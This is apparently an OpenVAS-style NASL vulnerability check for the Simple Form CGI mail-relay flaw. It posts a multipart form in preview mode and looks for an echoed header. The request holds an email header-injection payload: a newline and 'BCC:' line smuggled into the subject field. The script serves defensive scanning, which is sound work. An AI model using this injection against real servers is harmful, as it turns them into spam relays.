# SPDX-FileCopyrightText: 2004 George A. Theall
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14224");
  script_version("2023-08-01T13:29:10+0000");
  script_tag(name:"last_modification", value:"2023-08-01 13:29:10 +0000 (Tue, 01 Aug 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_xref(name:"OSVDB", value:"8412");
  script_name("Simple Form Mail Relaying Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2004 George A. Theall");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://worldcommunity.com/opensource/utilities/simple_form.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/10917");

  script_tag(name:"solution", value:"Upgrade to Simple Form 2.2 or later.");

  script_tag(name:"summary", value:"The target is running at least one instance of Simple Form which fails
  to validate the parameters 'admin_email_to' and 'admin_email_from'.");

  script_tag(name:"impact", value:"An attacker, exploiting this flaw, would be able to send email through
  the server (utilizing the form) to any arbitrary recipient with any
  arbitrary message content.  In other words, the remote host can be
  used as a mail relay for things like SPAM.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default:80 );
host = http_host_name( port:port );

foreach dir( make_list_unique( "/", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" )
    dir = "";

  url = dir + "/s_form.cgi";

  if( http_is_cgi_installed_ka( item:url , port:port ) ) {

    # Exploit the form and *preview* the message to determine if the
    # vulnerability exists. Note: this doesn't actually try to inject
    # a message but should be fairly accurate.
    #
    # nb: both vulnerable and non-vulnerable versions of the script will
    #     send a message if preview=no; the latter simply use hard-coded
    #     values for admin_email_from and admin_email_to only when
    #     actually sending the message. Fortunately, we can identify
    #     vulnerable versions because they fail to filter newlines in
    #     form_email_subject.
    boundary = "bound";
    req = string( "POST ",  url, " HTTP/1.1\r\n",
                  "Host: ", host, "\r\n",
                  "Referer: http://", host, "/\r\n",
                  "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
                  # nb: we'll add the Content-Length header and post data later.
                );
    boundary = string("--", boundary);
    postdata = string(
     boundary, "\r\n",
    'Content-Disposition: form-data; name="form_response_title"', "\r\n",
    "\r\n",
    "A Response\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="form_return_url"', "\r\n",
    "\r\n",
    "http://", host, "/\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="form_return_url_title"', "\r\n",
    "\r\n",
    "Home\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="form_fields"', "\r\n",
    "\r\n",
    "msg\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="required_fields"', "\r\n",
    "\r\n",
    "msg\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="admin_email_from"', "\r\n",
    "\r\n",
    "postmaster@example.com\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="admin_email_to"', "\r\n",
    "\r\n",
    "postmaster@example.com\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="form_email_subject"', "\r\n",
    "\r\n",
    "VT Plugin Test\nBCC: postmaster@example.com\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="msg"', "\r\n",
    "\r\n",
    "This is a mail relaying test.\r\n",

    boundary, "\r\n",
    'Content-Disposition: form-data; name="preview_data"', "\r\n",
    "\r\n",
    "yes\r\n",

    boundary, "--", "\r\n" );

    req = string( req,
                  "Content-Length: ", strlen(postdata), "\r\n",
                  "\r\n", postdata );

    res = http_keepalive_send_recv( port:port, data:req );

    # Look at the preview and see whether there's a BCC: header.
    if( egrep( string:res, pattern:"PREVIEW of Form Submission", icase:TRUE ) &&
        egrep( string:res, pattern:"^BCC: ", icase:TRUE ) ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
